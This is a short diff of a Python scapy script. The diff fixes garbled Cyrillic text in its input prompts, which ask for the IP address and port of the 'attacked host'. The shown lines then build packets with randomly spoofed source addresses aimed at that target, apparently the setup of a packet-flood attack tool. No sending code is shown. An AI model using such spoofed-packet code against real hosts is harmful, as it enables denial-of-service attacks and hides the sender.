@@ -1,7 +1,8 @@
-п»їfrom scapy.all import *
+# -*- coding: cp1251 -*-
+from scapy.all import *
 
-target_ip = str(input('IP - Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
-target_port = int(input('РќРѕРјРµСЂ РїРѕСЂС‚Р° Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+target_ip = str(input('IP - адрес атакуемого хоста: '))
+target_port = int(input('Номер порта атакуемого хоста: '))
 
 #ip = IP(dst=target_ip) #without_ip_spoofing
 ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip) #with_ip_spoofing
